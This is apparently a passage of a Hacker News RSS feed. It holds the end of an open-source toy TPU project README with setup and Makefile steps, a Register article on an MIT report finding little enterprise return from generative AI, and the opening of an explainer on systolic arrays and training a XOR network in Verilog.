<p dir="auto"><h2 tabindex="-1" dir="auto">Example Instruction Sequence</h2><a id="user-content-example-instruction-sequence" aria-label="Permalink: Example Instruction Sequence" href="#example-instruction-sequence"></a></p>
<p dir="auto">Instructions are directly loaded into an instruction buffer on the chip from a testbench file.</p>
<ul dir="auto">
<li>See <code>tests/tpu.v</code> for our forward and backward pass instruction sequence</li>
<li>See the <a href="#setup">Setup</a> section on how to run this testbench</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Future Steps</h2><a id="user-content-future-steps" aria-label="Permalink: Future Steps" href="#future-steps"></a></p>
<ol dir="auto">
<li>Compiler for this instruction set</li>
<li>Scaling TPU to larger dimensions (256×256 or 512×512)</li>
</ol>
<p dir="auto"><h2 tabindex="-1" dir="auto">Setup</h2><a id="user-content-setup" aria-label="Permalink: Setup" href="#setup"></a></p>
<p dir="auto">We are open source and appreciate any contributions! Here is our workflow and steps to set up our development environment:</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">MacOS Specific</h3><a id="user-content-macos-specific" aria-label="Permalink: MacOS Specific" href="#macos-specific"></a></p>
<ol dir="auto">
<li>Create a virtual environment and run:

</li>
<li>Install iverilog using Homebrew:

</li>
<li>Build gtkwave <strong>FROM SOURCE</strong> (important: other installation methods currently do not work)</li>
</ol>
<p dir="auto"><h3 tabindex="-1" dir="auto">Ubuntu/Linux Specific</h3><a id="user-content-ubuntulinux-specific" aria-label="Permalink: Ubuntu/Linux Specific" href="#ubuntulinux-specific"></a></p>
<ol dir="auto">
<li>Create a virtual environment and run:

</li>
<li>Install gtkwave:

</li>
<li>Install iverilog:
<div dir="auto" data-snippet-clipboard-copy-content="sudo apt install iverilog"><pre>sudo apt install iverilog</pre></div>
</li>
</ol>
<p dir="auto"><h2 tabindex="-1" dir="auto">Adding Modules</h2><a id="user-content-adding-modules" aria-label="Permalink: Adding Modules" href="#adding-modules"></a></p>
<p dir="auto">Follow these steps to add a new module to the project:</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">1. Create the Module File</h3><a id="user-content-1-create-the-module-file" aria-label="Permalink: 1. Create the Module File" href="#1-create-the-module-file"></a></p>
<p dir="auto">Add your new module file <code>&lt;MODULE_NAME&gt;.sv</code> in the <code>src/</code> directory.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">2. Create the Dump File</h3><a id="user-content-2-create-the-dump-file" aria-label="Permalink: 2. Create the Dump File" href="#2-create-the-dump-file"></a></p>
<p dir="auto">Create <code>dump_&lt;MODULE_NAME&gt;.sv</code> in the <code>test/</code> directory with the following code:</p>
<div dir="auto" data-snippet-clipboard-copy-content="module dump();
initial begin
  $dumpfile(&quot;waveforms/<MODULE_NAME>.vcd&quot;);
  $dumpvars(0, <MODULE_NAME>); 
end
endmodule"><pre><span>module</span> <span>dump</span>();
<span>initial</span> <span>begin</span>
  <span>$dumpfile</span>(<span><span>"</span>waveforms/&lt;MODULE_NAME&gt;.vcd<span>"</span></span>);
  <span>$dumpvars</span>(<span>0</span>, <span>&lt;</span><span>MODULE_NAME</span><span>&gt;</span>); 
<span>end</span>
<span>endmodule</span></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">3. Creating Tests</h3><a id="user-content-3-creating-tests" aria-label="Permalink: 3. Creating Tests" href="#3-creating-tests"></a></p>
<p dir="auto">Create <code>test_&lt;MODULE_NAME&gt;.py</code> in the <code>test/</code> directory.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">4. Makefile Updates</h3><a id="user-content-4-makefile-updates" aria-label="Permalink: 4. Makefile Updates" href="#4-makefile-updates"></a></p>
<p dir="auto">Add your module to the <code>SOURCES</code> variable and create a test target:</p>
<div dir="auto" data-snippet-clipboard-copy-content="test_<MODULE_NAME>: $(SIM_BUILD_DIR)
	$(IVERILOG) -o $(SIM_VVP) -s <MODULE_NAME> -s dump -g2012 $(SOURCES) test/dump_<MODULE_NAME>.sv
	PYTHONOPTIMIZE=$(NOASSERT) MODULE=test_<MODULE_NAME> $(VVP) -M $(COCOTB_LIBS) -m libcocotbvpi_icarus $(SIM_VVP)
	! grep failure results.xml
	mv <MODULE_NAME>.vcd waveforms/ 2>/dev/null || true"><pre><span>test_&lt;MODULE_NAME&gt;</span>: <span>$(<span>SIM_BUILD_DIR</span>)</span>
	<span>$(<span>IVERILOG</span>)</span> -o <span>$(<span>SIM_VVP</span>)</span> -s <span>&lt;</span>MODULE_NAME<span>&gt;</span> -s dump -g2012 <span>$(<span>SOURCES</span>)</span> test/dump_<span>&lt;</span>MODULE_NAME<span>&gt;</span>.sv
	PYTHONOPTIMIZE=<span>$(<span>NOASSERT</span>)</span> MODULE=test_<span>&lt;</span>MODULE_NAME<span>&gt;</span> <span>$(<span>VVP</span>)</span> -M <span>$(<span>COCOTB_LIBS</span>)</span> -m libcocotbvpi_icarus <span>$(<span>SIM_VVP</span>)</span>
	<span>!</span> grep failure results.xml
	mv <span>&lt;</span>MODULE_NAME<span>&gt;</span>.vcd waveforms/ <span>2&gt;</span>/dev/null <span>||</span> <span>true</span></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">5. View Waveforms</h3><a id="user-content-5-view-waveforms" aria-label="Permalink: 5. View Waveforms" href="#5-view-waveforms"></a></p>
<p dir="auto">Run the following command to view the generated waveforms:</p>
<div dir="auto" data-snippet-clipboard-copy-content="gtkwave waveforms/<MODULE_NAME>.vcd"><pre>gtkwave waveforms/<span>&lt;</span>MODULE_NAME<span>&gt;</span>.vcd</pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Makefile Commands</h2><a id="user-content-makefile-commands" aria-label="Permalink: Makefile Commands" href="#makefile-commands"></a></p>
<p dir="auto">Run tests:</p>

<p dir="auto">View waveforms:</p>
<div dir="auto" data-snippet-clipboard-copy-content="gtkwave waveforms/<MODULE_NAME>.vcd"><pre>gtkwave waveforms/<span>&lt;</span>MODULE_NAME<span>&gt;</span>.vcd</pre></div>
<p dir="auto">Or use the shorthand:</p>

<p dir="auto"><h2 tabindex="-1" dir="auto">GTKWwave Setup</h2><a id="user-content-gtkwwave-setup" aria-label="Permalink: GTKWwave Setup" href="#gtkwwave-setup"></a></p>
<ol dir="auto">
<li>Right-click all signals</li>
<li>Navigate to: <strong>Data Format</strong> → <strong>Fixed Point Shift</strong> → <strong>Specify</strong></li>
<li>Enter <code>8</code> and click <strong>OK</strong></li>
<li>Set: <strong>Data Format</strong> → <strong>Signed Decimal</strong></li>
<li>Enable: <strong>Data Format</strong> → <strong>Fixed Point Shift</strong> → <strong>ON</strong></li>
</ol>
<p dir="auto"><h2 tabindex="-1" dir="auto">What is a .gtkw File?</h2><a id="user-content-what-is-a-gtkw-file" aria-label="Permalink: What is a .gtkw File?" href="#what-is-a-gtkw-file"></a></p>
<p dir="auto">A <code>.gtkw</code> file stores the signal configuration for <code>make show_&lt;MODULE_NAME&gt;</code>. You only need to save it once after running:</p>
<div dir="auto" data-snippet-clipboard-copy-content="gtkwave waveforms/<MODULE_NAME>.vcd"><pre>gtkwave waveforms/<span>&lt;</span>MODULE_NAME<span>&gt;</span>.vcd</pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Motivation</h2><a id="user-content-motivation" aria-label="Permalink: Motivation" href="#motivation"></a></p>
<p dir="auto">The details of TPU architecture are closed source, as is most of chip design. We want this resource to be the ultimate guide to breaking into building chip accelerators for all levels of technical expertise — even if you just learned high school math and only know y = mx + b.</p>
<p dir="auto">Before this project, none of us had professional experience in hardware architecture/design. We started this ambitious project as a dedicated group wanting to break into hardware design. We've collectively gained significant design experience from this project.</p>
<p dir="auto">We hope that the inventive nature of the article at <a href="https://tinytpu.com/" rel="nofollow">tinytpu.com</a>, this README, and the code in this repository will help you walk through our steps and learn how to approach problems with an inventive mindset.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[GenAI FOMO has spurred businesses to light nearly $40B on fire (232 pts)]]></title>
            <link>https://www.theregister.com/2025/08/18/generative_ai_zero_return_95_percent/</link>
            <guid>44944620</guid>
            <pubDate>Mon, 18 Aug 2025 19:54:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theregister.com/2025/08/18/generative_ai_zero_return_95_percent/">https://www.theregister.com/2025/08/18/generative_ai_zero_return_95_percent/</a>, See on <a href="https://news.ycombinator.com/item?id=44944620">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
<p>US companies have invested between $35 and $40 billion in Generative AI initiatives and, so far, have almost nothing to show for it.</p>
<p>According to <a href="https://docs.google.com/forms/d/e/1FAIpQLSc8rU8OpQWU44gYDeZyINUZjBFwu--1uTbxixK_PRSVrfaH8Q/viewform" rel="nofollow">a report</a> [PDF] from MIT's NANDA (Networked Agents and Decentralized AI) initiative, 95 percent of enterprise organizations have gotten zero return from their AI efforts.</p>
<p>Only 5 percent of organizations have successfully integrated AI tools into production at scale.</p>

    

<p>The report is based on 52 structured interviews with enterprise leaders and on analysis of more than 300 public AI initiatives and announcements, and a survey of 153 business professionals.</p>

        


        

<p>The report authors – Aditya Challapally, Chris Pease, Ramesh Raskar, and Pradyumna Chari – attribute this GenAI Divide not to insufficient infrastructure, learning, or talent, but to the inability of AI systems to retain data, to adapt, and to learn over time.</p>
<blockquote>

<p>The GenAI Divide is starkest in deployment rates, only 5 percent of custom enterprise AI tools reach production</p>
</blockquote>
<p>"The GenAI Divide is starkest in deployment rates, only 5 percent of custom enterprise AI tools reach production," the report says. "Chatbots succeed because they're easy to try and flexible, but fail in critical workflows due to lack of memory and customization."</p>
<p>As an unidentified CIO put it in an interview with the authors, "We've seen dozens of demos this year. Maybe one or two are genuinely useful. The rest are wrappers or science projects."</p>
<p>The authors' findings echo <a href="https://www.theregister.com/2025/07/09/csuite_sours_on_ai/">other recent research</a> showing a decline in confidence about AI initiatives among corporate leaders.</p>

        

<p>The NANDA report does say that a small percentage of companies have found GenAI helpful and that the technology is having a material impact on two out of nine industrial sectors – Technology and Media &amp; Telecom.&nbsp;</p>
<p>For the remaining sectors –&nbsp;Professional Services, Healthcare &amp; Pharma, Consumer &amp; Retail, Financial Services, Advanced Industries, and Energy &amp; Materials – Generative AI has been inconsequential.</p>
<p>An unidentified COO at a mid-market manufacturing firm is quoted as saying, "The hype on LinkedIn says everything has changed, but in our operations, nothing fundamental has shifted. We're processing some contracts faster, but that's all that has changed."</p>

        

<p>One thing that is changing is the employment landscape, at least in affected industries. In the Technology and Media sectors, the report notes, "[more than] 80 percent of executives anticipate reduced hiring volumes within 24 months."</p>
<p>According to the authors, the GenAI-driven workforce reductions have been occurring in non-core business activities that often get outsourced, such as customer support operations, administrative processing, and standardized development tasks.&nbsp;</p>
<p>"These roles exhibited vulnerability prior to AI implementation due to their outsourced status and process standardization," the report says, suggesting that, in the affected sectors, between five and 20 percent of support and admin processing has been impacted.&nbsp;</p>
<ul>

<li><a href="https://www.theregister.com/2025/08/18/aws_updated_kiro_pricing/">AWS pricing for Kiro dev tool dubbed 'a wallet-wrecking tragedy'</a></li>

<li><a href="https://www.theregister.com/2025/08/18/ai_form_fillers/">UK drafts AI to help Joe Public decipher its own baffling bureaucracy</a></li>

<li><a href="https://www.theregister.com/2025/08/18/opinion_column_gen_ai/">Generative AI isn't just a matter of life and death. It's far more important than that</a></li>

<li><a href="https://www.theregister.com/2025/08/17/nabiha_syed_remakes_mozilla_foundation/">Nabiha Syed remakes Mozilla Foundation in the era of Trump and AI</a></li>
</ul>
<p><em>The Register</em> has been told that Oracle's <a href="https://www.theregister.com/2025/08/15/oracle_cuts_300_in_california/">recent layoffs</a> reflect efforts to balance AI capital expenditures, <a href="https://www.theregister.com/2025/07/31/amazon_earnings_q2_2025/">an albatross around the necks of US tech giants</a>. At IBM, staffers have argued that <a href="https://www.theregister.com/2024/09/24/ibm_layoffs_ai_talent/">AI has been used as an excuse to offshore jobs</a>.</p>
<p>Whatever the stated rationale and actual motive for job cuts may be, Generative AI is having an impact on the Tech and Media &amp; Telecom sectors, where it has seen the broadest adoption.</p>
<p>While about 50 percent of AI budgets get allocated to marketing and sales, the report authors suggest that corporate investment instead should flow toward activities generating meaningful business results. This includes lead qualification and customer retention on the front end and, in the elimination of business process outsourcing, ad agency spending, and financial service risk checking on the back end.&nbsp;</p>
<p>Looking at the way Generative AI has been successful for certain companies, the report argues that generic tools like OpenAI's ChatGPT do better than bespoke enterprise tools, even when those enterprise tools use the same AI models under the hood.</p>
<p>The stated reason is that workers tend to be more familiar with ChatGPT's interface and thus use it more – a consequence of employee-driven shadow IT. The report cites an interview with a corporate lawyer who described her mid-size firm's dissatisfaction with a specialized contract analysis tool that cost $50,000.</p>
<p>"Our purchased AI tool provided rigid summaries with limited customization options," the attorney told the researchers. "With ChatGPT, I can guide the conversation and iterate until I get exactly what I need. The fundamental quality difference is noticeable, ChatGPT consistently produces better outputs, even though our vendor claims to use the same underlying technology."</p>
<p>Companies that bridge the GenAI divide approach AI procurement as business process outsourcing customers rather than as software-as-a-service clients, the authors argue.</p>
<p>"They demand deep customization, drive adoption from the front lines, and hold vendors accountable to business metrics," the report concludes. "The most successful buyers understand that crossing the divide requires partnership, not just purchase." ®</p>                                
                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: I built a toy TPU that can do inference and training on the XOR problem (116 pts)]]></title>
            <link>https://www.tinytpu.com</link>
            <guid>44944592</guid>
            <pubDate>Mon, 18 Aug 2025 19:52:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.tinytpu.com">https://www.tinytpu.com</a>, See on <a href="https://news.ycombinator.com/item?id=44944592">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>Nobody really understands how TPUs work…and neither do we! So we wanted to make this because we wanted to take a shot and try to guess how it works–from the perspective of complete novices!</p><p>We wanted to do something very challenging to prove to ourselves that we can do anything we put our mind to. The reasoning for why we chose to build a TPU specifically is fairly simple:</p><p>None of us have real professional experience in hardware design, which, in a way, made the TPU even more appealing since we weren't able to estimate exactly how difficult it would be. As we worked on the initial stages of this project, we established a strict design philosophy: ALWAYS TRY THE HACKY WAY. This meant trying out the "dumb" ideas that came to our mind first BEFORE consulting external sources. This philosophy helped us make sure we weren't reverse engineering the TPU, but rather <b>re-inventing it</b>, which helped us derive many of the key mechanisms used in the TPU ourselves.</p><p>We also wanted to treat this project as an exercise to code without relying on AI to write for us, since we felt that our initial instinct recently has been to reach for these AI tools whenever we faced a slight struggle. We wanted to cultivate a certain<!-- --> <b>style of thinking</b> that we could take forward with us and use in any future endeavours to think through difficult problems.<sup><a href="#fn1" id="fn1-ref">[1]</a></sup></p><div><p>A TPU is an application specific chip (ASIC) designed by Google to make inferencing (using) and training ML models faster and more efficient. Whereas a GPU can be used to render frames AND run ML workloads, a TPU can only perform math operations, allowing it to be better at what it's designed for. Naturally, trying to master a single task is much easier and will yield better results than trying to master multiple tasks and the TPU strongly employs this philosophy.</p><div><div><p><i>Quick primer on hardware design:</i></p><p>In hardware, the unit of time we're dealing with is called a clock cycle. This is an arbitrary period of time that we can set, as developers, to meet our requirements. Generally, a single clock cycle can range from 1 picosecond (ps) to 1 nanosecond (ns) and any operations we run will be executed BETWEEN clock cycles.</p></div><figure><p><img alt="Clock cycle diagram" loading="lazy" width="679" height="269" decoding="async" data-nimg="1" src="https://www.tinytpu.com/clock-cycle.svg"></p><figcaption>Clock cycle timing diagram showing how operations are synchronized in hardware</figcaption></figure><p>The language we use to describe hardware is called Verilog. It's a hardware description language that allows us to describe the behaviour of a given hardware module (similar to functions in software), but instead of executing as a program, it synthesizes into boolean logic gates (AND, OR, NOT, etc.) that can be combined to build the digital logic for any chip we want. Here's a simple example of an addition in Verilog:</p><br><pre><code>module add <span>(</span>
    <span>input</span> wire <span>clk</span>,
    <span>// reset signal to reset the module</span>
    <span>input</span> wire <span>rst</span>,

    <span>// registers to hold the <span>input</span> and <span>output</span> values</span>
    <span>input</span> reg a,
    <span>input</span> reg b,
    <span>output</span> reg c
  <span>)</span>;
    
    <span>always</span> @<span>(</span><span>posedge</span> <span>clk</span><span>)</span> <span>begin</span> 

    <span>// everything in this block will be executed every clock cycle</span>
    
      <span>if</span> <span>(</span><span>rst</span><span>)</span> <span>begin</span>
      <span>// reset the <span>output</span> to <span>0</span> when the reset signal is high</span>
        c <span>&lt;=</span> <span>0</span>; 
      <span>end</span> <span>else</span> <span>begin</span>
        <span>// add the two inputs and store the result in the <span>output</span></span>
        c <span>&lt;=</span> a <span>+</span> b; 
      <span>end</span>
    <span>end</span>

endmodule
</code></pre><p>In the example above, the value of the signal b at the next clock cycle is set to the current value of the signal a. You'll find that in most cases, signals (variables) are updated in sequential clock cycles, as opposed to immediate updates like you would find in software design.</p></div><p>Specifically, the TPU is very efficient at performing matrix multiplications, which make up 80-90% of the compute operations in transformers (up to 95% in very large models) and 70-80% in CNNs. Each matrix multiplication represents the calculation for a single layer in an MLP, and in deep learning, we have many of these layers, making TPUs increasingly efficient for larger models.</p></div><div><p>When we started this project, all we knew was that the equation y = mx + b is the foundational building block for neural networks. However, we needed to fully UNDERSTAND the math behind neural networks to build other modules in our TPU. So before we started writing any code, each of us worked out the math of a simple 2 -&gt; 2 -&gt; 1 multi-layer perceptron (MLP).</p><figure><p><img alt="XOR MLP Neural Network Architecture showing 2 input nodes, 2 hidden layer nodes, and 1 output node with weight connections" loading="lazy" width="679" height="269" decoding="async" data-nimg="1" src="https://www.tinytpu.com/xor-mlp.svg"></p><figcaption>Architecture of our 2→2→1 multi-layer perceptron for solving the XOR problem</figcaption></figure><br><h3>Why XOR?</h3><p>The reason we chose this specific network is because we were targeting inference and training for the XOR problem (the "hello world" of neural networks). The XOR problem is one of the simplest problems a neural network can solve. All other gates (AND, OR, etc) can predict the outputs from its inputs using just one linear line (one neuron) to separate which inputs correspond to a 0 and which ones correspond to a 1. But to classify all XOR, an MLP is needed, since it requires curved decision boundaries, which can't be achieved with ONLY linear equations. For a geometric and first-principles treatment, the free book<!-- --> <a href="https://udlbook.github.io/udlbook/" target="_blank" rel="noopener noreferrer">Understanding Deep Learning</a> <!-- -->is excellent.</p><figure><p><img alt="OR and XOR decision boundaries" loading="lazy" width="679" height="269" decoding="async" data-nimg="1" src="https://www.tinytpu.com/or-xor.svg"></p><figcaption>OR and XOR decision boundaries</figcaption></figure><h3>Batching and dimensions</h3><p>Now, say we want to do continuous inference (i.e. self driving car making multiple predictions a second). That would imply that we're sending multiple pieces of data at once. Since data is inherently multidimensional and has many features, we would have matrices with very large dimensions. However, the XOR problem simplifies the dimensions for us, as there are only two features (0 or 1) and 4 possible pieces of input data (four possible binary combinations of 0 and 1). This gives us a 4x2 matrix, where 4 is the number of rows (batch size) and 2 is the number of columns (feature size).</p><div><p>The XOR input matrix and target outputs:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="bold">X</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>∈</mo><msup><mi mathvariant="double-struck">R</mi><mrow><mn>4</mn><mo>×</mo><mn>2</mn></mrow></msup><mo separator="true">,</mo><mspace width="1em"></mspace><mi mathvariant="bold">y</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>∈</mo><msup><mi mathvariant="double-struck">R</mi><mrow><mn>4</mn><mo>×</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">
                  \mathbf{X} =
                  \begin{bmatrix}
                  0 &amp; 0 \\[0.3em]
                  0 &amp; 1 \\[0.3em]
                  1 &amp; 0 \\[0.3em]
                  1 &amp; 1
                  \end{bmatrix} \in \mathbb{R}^{4 \times 2}, \quad
                  \mathbf{y} = \begin{bmatrix} 0 \\[0.3em] 1 \\[0.3em] 1 \\[0.3em] 0 \end{bmatrix} \in \mathbb{R}^{4 \times 1}
                </annotation></semantics></math></span></span></span></p></div><p>Each row represents one of the four possible XOR inputs, and the output vector shows the expected XOR results</p></div><p>Another simplification we're making for our systolic array example here is that we'll use a 2x2 instead of the 256x256 array used in the TPUv1. However, the math is still faithful so nothing is actually dumbed down, rather scaled down instead.</p><p>The first step in the equation is multiplying m with x, which, in matrix form, would be<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">X</mi><msup><mi mathvariant="bold">W</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">\mathbf{X}\mathbf{W}^T</annotation></semantics></math></span></span></span>.</p><div><p>More formally:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="bold">Z</mi><mo>=</mo><mi mathvariant="bold">X</mi><msup><mi mathvariant="bold">W</mi><mi>T</mi></msup><mo>+</mo><mi mathvariant="bold">b</mi></mrow><annotation encoding="application/x-tex">\mathbf{Z} = \mathbf{X}\mathbf{W}^T + \mathbf{b}</annotation></semantics></math></span></span></span></p></div><p>where<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">X</mi><mo>∈</mo><msup><mi mathvariant="double-struck">R</mi><mrow><mi>n</mi><mo>×</mo><mi>d</mi></mrow></msup></mrow><annotation encoding="application/x-tex">\mathbf{X} \in \mathbb{R}^{n \times d}</annotation></semantics></math></span></span></span> <!-- -->is our input matrix,<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">W</mi><mo>∈</mo><msup><mi mathvariant="double-struck">R</mi><mrow><mi>m</mi><mo>×</mo><mi>d</mi></mrow></msup></mrow><annotation encoding="application/x-tex">\mathbf{W} \in \mathbb{R}^{m \times d}</annotation></semantics></math></span></span></span> <!-- -->is our weight matrix, and<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">b</mi><mo>∈</mo><msup><mi mathvariant="double-struck">R</mi><mrow><mn>1</mn><mo>×</mo><mi>m</mi></mrow></msup></mrow><annotation encoding="application/x-tex">\mathbf{b} \in \mathbb{R}^{1 \times m}</annotation></semantics></math></span></span></span> <!-- -->is our bias vector</p></div><p>How can we perform matrix multiplication in hardware? Well, we can use a unit called the systolic array!</p><h3>Systolic array and PEs</h3><p>The heart of a TPU is a unit called the systolic array.<sup><a href="#fn2" id="fn2-ref">[2]</a></sup> <!-- -->It consists of individual building blocks called Processing Elements (PE) which are connected together in a grid-like structure. Each PE performs a multiply-accumulate operation, meaning it multiplies an incoming input X with a stationary weight W<sup><a href="#fn3" id="fn3-ref">[3]</a></sup> <!-- -->and adds it to an incoming accumulated sum, all in the same clock cycle.</p><figure><p><img alt="PE diagram" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/PE.svg"></p><figcaption>Processing Element (PE) architecture showing multiply-accumulate operation (without load weight and start flags)</figcaption></figure><div><pre><code><span>always_ff</span> @<span>(</span><span>posedge</span> <span>clk</span> or <span>posedge</span> <span>rst</span><span>)</span> <span>begin</span>
        <span>if</span> <span>(</span><span>rst</span><span>)</span> <span>begin</span>
            <span>input_out</span> <span>&lt;=</span> <span>0</span>;
            <span>psum_out</span> <span>&lt;=</span> <span>0</span>;
            <span>weight_reg</span> <span>&lt;=</span> <span>0</span>;
        <span>end</span> <span>else</span> <span>if</span> <span>(</span><span>load_weight</span><span>)</span> <span>begin</span>
            <span>weight_reg</span> <span>&lt;=</span> <span>weight</span>;
        <span>end</span> <span>else</span> <span>if</span> <span>(</span><span>start</span><span>)</span> <span>begin</span>
            <span>input_out</span> <span>&lt;=</span> <span>input_in</span>;
            <span>// the main multiply-accumulate operation</span>
            <span>psum_out</span> <span>&lt;=</span> <span>(</span><span>input_in</span> <span>*</span> <span>weight_reg</span><span>)</span> <span>+</span> <span>psum_in</span>;
        <span>end</span>
    <span>end</span></code></pre></div><h3>Systolic matrix multiplication</h3><p>When these PEs are connected together, they can be used to perform matrix multiplication systolically, meaning multiple elements of the output matrix can be calculated every clock cycle. The inputs enter the systolic array from the left and move to the neighbouring PE to the right, every clock cycle. The accumulated sums start with the multiplication output from the first row of PEs, move downwards, and get added to the products of each successive PE, until they up at the last row of PEs where they become an element of the output matrix.</p><figure><p><img alt="Systolic array diagram" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/sys-array-standalone.svg"></p><figcaption>Systolic array architecture showing how PEs are connected to perform matrix multiplication</figcaption></figure><p>Because of this single unit (and the fact that matrix multiplications dominate the computations performed in models), TPUs can very easily inference and train any model.</p><h3>Worked example</h3><p>Now let's walk through the example of our XOR problem:</p><p>Our systolic array takes two inputs: the input matrix and the weight matrix. For our XOR network, we initialize with the following weights and biases:</p><div><p>Layer 1 parameters:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="bold">W</mi><mn>1</mn></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.2985</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.5792</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0913</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.4234</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>∈</mo><msup><mi mathvariant="double-struck">R</mi><mrow><mn>2</mn><mo>×</mo><mn>2</mn></mrow></msup><mo separator="true">,</mo><mspace width="1em"></mspace><msub><mi mathvariant="bold">b</mi><mn>1</mn></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.4939</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.189</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>∈</mo><msup><mi mathvariant="double-struck">R</mi><mrow><mn>1</mn><mo>×</mo><mn>2</mn></mrow></msup></mrow><annotation encoding="application/x-tex">\mathbf{W}_1 = \begin{bmatrix} \phantom{-}0.2985 &amp; -0.5792 \\[0.3em] \phantom{-}0.0913 &amp; \phantom{-}0.4234 \end{bmatrix} \in \mathbb{R}^{2 \times 2}, \quad \mathbf{b}_1 = \begin{bmatrix} -0.4939 &amp; \phantom{-}0.189\phantom{0} \end{bmatrix} \in \mathbb{R}^{1 \times 2}</annotation></semantics></math></span></span></span></p></div><p>Layer 2 parameters:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="bold">W</mi><mn>2</mn></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.5266</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.2958</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>∈</mo><msup><mi mathvariant="double-struck">R</mi><mrow><mn>1</mn><mo>×</mo><mn>2</mn></mrow></msup><mo separator="true">,</mo><mspace width="1em"></mspace><msub><mi mathvariant="bold">b</mi><mn>2</mn></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.6358</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>∈</mo><msup><mi mathvariant="double-struck">R</mi><mrow><mn>1</mn><mo>×</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">\mathbf{W}_2 = \begin{bmatrix} \phantom{-}0.5266 &amp; \phantom{-}0.2958 \end{bmatrix} \in \mathbb{R}^{1 \times 